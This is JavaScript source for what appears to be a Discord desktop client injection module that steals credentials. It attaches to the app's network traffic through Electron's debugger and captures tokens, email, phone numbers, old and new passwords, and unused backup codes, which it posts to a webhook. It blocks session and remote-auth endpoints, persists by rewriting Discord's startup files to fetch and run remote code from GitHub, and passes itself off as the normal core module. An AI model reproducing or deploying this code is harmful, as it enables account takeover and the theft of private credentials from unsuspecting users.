const fs = require('fs');
const os = require('os');
const https = require('https');
const args = process.argv;
const path = require('path');
const querystring = require('querystring');

const {
    BrowserWindow,
    session,
} = require('electron');

const CONFIG = {
    webhook: "%WEBHOOK%",
    injection_url: "https://raw.githubusercontent.com/emir64/injection/main/injection.js",
    filters: {
        urls: [
            '/auth/login',
            '/auth/register',
            '/mfa/totp',
            '/mfa/codes-verification',
            '/users/@me',
        ],
    },
    filters2: {
        urls: [
            'wss://remote-auth-gateway.discord.gg/*',
            'https://discord.com/api/v*/auth/sessions',
            'https://*.discord.com/api/v*/auth/sessions',
            'https://discordapp.com/api/v*/auth/sessions'
        ],
    },
    API: "https://discord.com/api/v9/users/@me",
    badge_emojis: {
        "staff": "<:staff:1348413894842126336>",
        "partner": "<:partner:1348414200611082301>",
        "certified_moderator": "<:certified_moderator:1348414466299138129>",
        "hypesquad": "<:hypesquad:1348414690832679003>",
        "hypesquad_house_1": "<:hypesquad_house_1:1348404497092972586>",
        "hypesquad_house_2": "<:hypesquad_house_2:1348415253150433290>",
        "hypesquad_house_3": "<:hypesquad_house_3:1348415513927356416>",
        "bug_hunter_level_1": "<:bug_hunter_level_1:1348416013867159723>",
        "bug_hunter_level_2": "<:bug_hunter_level_2:1348416011803557918>",
        "active_developer": "<:active_developer:1348403440644128845>",
        "verified_developer": "<:verified_developer:1348416527002763264>",
        "early_supporter": "<:early_supporter:1348416850844975164>",
        "premium": "<:nitro:1348404298563977306>",
        "legacy_username": "<:legacy_username:1348405451930206229>",
        "premium_tenure_1_month": "<:premium_tenure_1_month:1348421127222853786>",
        "premium_tenure_3_month": "<:premium_tenure_3_month:1348420741326180473>",
        "premium_tenure_6_month": "<:premium_tenure_6_month:1348418995602198609>",
        "premium_tenure_12_month": "<:premium_tenure_12_month:1348421855450632212>",
        "premium_tenure_24_month": "<:premium_tenure_24_month:1348422086552584263>",
        "premium_tenure_36_month": "<:premium_tenure_36_month:1348422496348672092>",
        "premium_tenure_60_month": "<:premium_tenure_60_month:1348422672589000825>",
        "premium_tenure_72_month": "<:premium_tenure_72_month:1348423086223130695>",
        "guild_booster_lvl1": "<:guild_booster_lvl1:1348423405355008043>",
        "guild_booster_lvl2": "<:guild_booster_lvl2:1348423683370389636>",
        "guild_booster_lvl3": "<:guild_booster_lvl3:1348424182333182013>",
        "guild_booster_lvl4": "<:guild_booster_lvl4:1348426497198653471>",
        "guild_booster_lvl5": "<:guild_booster_lvl5:1348426708038062184>",
        "guild_booster_lvl6": "<:guild_booster_lvl6:1348426926473085032>",
        "guild_booster_lvl7": "<:guild_booster_lvl7:1348427320742117376>",
        "guild_booster_lvl1": "<:guild_booster_lvl8:1348427621905465484>",
        "guild_booster_lvl9": "<:guild_booster_lvl9:1348427792991256656>",
    },
};

const executeJS = script => {
    const window = BrowserWindow.getAllWindows()[0];
    return window.webContents.executeJavaScript(script, !0);
};

const clearAllUserData = () => {
    executeJS("document.body.appendChild(document.createElement`iframe`).contentWindow.localStorage.clear()");
    executeJS("location.reload()");
};

const getToken = async () => await executeJS(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`);

const request = async (method, url, headers, data) => {
    url = new URL(url);
    const options = {
        protocol: url.protocol,
        hostname: url.host,
        path: url.pathname,
        method: method,
        headers: {
            "Access-Control-Allow-Origin": "*",
        },
    };

    if (url.search) options.path += url.search;
    for (const key in headers) options.headers[key] = headers[key];
    const req = https.request(options);
    if (data) req.write(data);
    req.end();

    return new Promise((resolve, reject) => {
        req.on("response", res => {
            let data = "";
            res.on("data", chunk => data += chunk);
            res.on("end", () => resolve(data));
        });
    });
};

const fetch = async (endpoint, headers) => {
    return JSON.parse(await request("GET", CONFIG.API + endpoint, headers));
};

const fetchAccount = async token => await fetch("", {
    "Authorization": token
});

const GetProfile = async token => {
    const response = await request("GET", `https://discord.com/api/v9/users/${Buffer.from(token.split('.')[0], 'base64').toString('binary')}/profile`, {
        "Content-Type": "application/json",
        "Authorization": token
    })
    return JSON.parse(response)
}

const GetBadges = async (token) => {

    const profile = await GetProfile(token);
    const badges = profile.badges; 

    if (badges && badges.length > 0) {
        const emojis = badges.map(badge => {
            return CONFIG.badge_emojis[badge.id] || "";
        }).filter(emoji => emoji !== "")

        return emojis.length ? emojis.join(" ") : "```Not Found```";
    } else {
        return "```Not Found```";
    }
}

const SendWebhook = async(embed_data) =>  {
    await request("POST", CONFIG.webhook, {
        "Content-Type": "application/json"
    }, JSON.stringify(embed_data));
}

const BackupCodesViewed = async (codes, token) => {
    const account = await fetchAccount(token)

    const filteredCodes = codes.filter((code) => {
        return code.consumed === false;
    });

    let message = "";
    for (let code of filteredCodes) {
        message += `${code.code.substr(0, 4)}-${code.code.substr(4)}\n`;
    }
    const embed_data = {
        embeds: [{
            color: 0x303037,
            thumbnail: {
                url: `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}?size=512`
            },
            author: {
                name: `Backup Codes - ${account.username}`,
                icon_url: `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}?size=512`
            },
            fields: [
                {
                    name: "<:Donator:1348376861637480479> Token:",
                    value: "```copy\n" + token + "```",
                },
                {
                    name: "<:Email:1348377346305953906> Email:",
                    value: "```copy\n" + account.email + "```",
                },
                {
                    name: "<:member:1348381552714973204> Phone:",
                    value: account.phone ? "```copy\n" + account.phone + "```": "```Not Found```",
                },
                {
                    name: "<:Star:1348390952146047078> Badges:",
                    value: await GetBadges(token)
                },
                {
                    name: "Backup Codes",
                    value: "```" + message + "```",
                },
            ],
            footer: {
                text: `${account.id}`,
            },
        }]
    }
    await SendWebhook(embed_data)
}

const PasswordChanged = async (newPassword, oldPassword, token) => {
    const account = await fetchAccount(token)
    const embed_data = {
        embeds: [{
            color: 0x303037,
            thumbnail: {
                url: `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}?size=512`
            },
            author: {
                name: `Password Changed - ${account.username}`,
                icon_url: `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}?size=512`
            },
            fields: [
                {
                    name: "<:Donator:1348376861637480479> Token:",
                    value: "```copy\n" + token + "```",
                },
                {
                    name: "<:Email:1348377346305953906> Email:",
                    value: "```copy\n" + account.email + "```",
                },
                {
                    name: "<:member:1348381552714973204> Phone:",
                    value: account.phone ? "```copy\n" + account.phone + "```": "```Not Found```",
                },
                {
                    name: "<:Star:1348390952146047078> Badges:",
                    value: await GetBadges(token)
                },
                {
                    name: "<:unlocked:1348875531843797052> New Password:",
                    value: "```copy\n" + newPassword + "```",
                },
                {
                    name: "<:locked:1348875454643310622> Old Password:",
                    value: "```copy\n" + oldPassword + "```",
                },
            ],
            footer: {
                text: `${account.id}`,
            },
        }]
    }
    await SendWebhook(embed_data)
}

const discordPath = (function () {
    const app = args[0].split(path.sep).slice(0, -1).join(path.sep);
    let resourcePath;

    if (process.platform === 'win32') {
        resourcePath = path.join(app, 'resources');
    } else if (process.platform === 'darwin') {
        resourcePath = path.join(app, 'Contents', 'Resources');
    }

    if (fs.existsSync(resourcePath)) return {
        resourcePath,
        app
    };
    return {
        undefined,
        undefined
    };
})();

async function initiation() {
    if (fs.existsSync(path.join(__dirname, 'initiation'))) {
        fs.rmdirSync(path.join(__dirname, 'initiation'));
        const token = await getToken();
        if (!token) return;
        clearAllUserData();
    }

    const {
        resourcePath,
        app
    } = discordPath;
    if (resourcePath === undefined || app === undefined) return;
    const appPath = path.join(resourcePath, 'app');
    const packageJson = path.join(appPath, 'package.json');
    const resourceIndex = path.join(appPath, 'index.js');
    const coreVal = fs.readdirSync(`${app}\\modules\\`).filter(x => /discord_desktop_core-+?/.test(x))[0]
    const indexJs = `${app}\\modules\\${coreVal}\\discord_desktop_core\\index.js`;
    const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar');
    if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
    if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
    if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);

    if (process.platform === 'win32' || process.platform === 'darwin') {
        fs.writeFileSync(
            packageJson,
            JSON.stringify({
                    name: 'discord',
                    main: 'index.js',
                },
                null,
                4,
            ),
        );

        const startUpScript = `const fs = require('fs'), https = require('https');
  const indexJs = '${indexJs}';
  const bdPath = '${bdPath}';
  const fileSize = fs.statSync(indexJs).size
  fs.readFileSync(indexJs, 'utf8', (err, data) => {
      if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
          init();
  })
  async function init() {
      https.get('${CONFIG.injection_url}', (res) => {
          const file = fs.createWriteStream(indexJs);
          res.replace('%WEBHOOK%', '${CONFIG.webhook}')
          res.pipe(file);
          file.on('finish', () => {
              file.close();
          });
      
      }).on("error", (err) => {
          setTimeout(init(), 10000);
      });
  }
  require('${path.join(resourcePath, 'app.asar')}')
  if (fs.existsSync(bdPath)) require(bdPath);`;
        fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, '\\\\'));
    }
}

let email = "";
let password = "";
let initiationCalled = false;
const createWindow = () => {
    mainWindow = BrowserWindow.getAllWindows()[0];
    if (!mainWindow) return

    mainWindow.webContents.debugger.attach('1.3');
    mainWindow.webContents.debugger.on('message', async (_, method, params) => {
        if (!initiationCalled) {
            await initiation();
            initiationCalled = true;
        }

        if (method !== 'Network.responseReceived') return;
        if (!CONFIG.filters.urls.some(url => params.response.url.endsWith(url))) return;
        if (![200, 202].includes(params.response.status)) return;

        const responseUnparsedData = await mainWindow.webContents.debugger.sendCommand('Network.getResponseBody', {
            requestId: params.requestId
        });
        const responseData = JSON.parse(responseUnparsedData.body);

        const requestUnparsedData = await mainWindow.webContents.debugger.sendCommand('Network.getRequestPostData', {
            requestId: params.requestId
        });
        const requestData = JSON.parse(requestUnparsedData.postData);

        switch (true) {
            case params.response.url.endsWith('/codes-verification'):
                BackupCodesViewed(responseData.backup_codes, await getToken());
                break;

            case params.response.url.endsWith('/@me'):
                if (!requestData.password) return;
                if (requestData.new_password) {
                    PasswordChanged(requestData.new_password, requestData.password, responseData.token);
                }
                break;
        }
    });

    mainWindow.webContents.debugger.sendCommand('Network.enable');

    mainWindow.on('closed', () => {
        createWindow()
    });
}
createWindow();

session.defaultSession.webRequest.onBeforeRequest(CONFIG.filters2, (details, callback) => {
    if (details.url.startsWith("wss://remote-auth-gateway") || details.url.endsWith("auth/sessions")) return callback({
        cancel: true
    })
});

module.exports = require("./core.asar");